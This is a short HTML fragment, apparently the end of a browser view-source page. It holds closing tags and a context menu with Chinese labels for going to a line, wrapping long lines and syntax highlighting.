<span id="line489"></span></span></pre><menu type="context" id="actions"><menuitem id="goToLine" label="转到指定行…" accesskey="L"></menuitem><menuitem id="wrapLongLines" label="长行自动换行" type="checkbox"></menuitem><menuitem id="highlightSyntax" label="语法高亮" type="checkbox" checked="true"></menuitem></menu></body></html>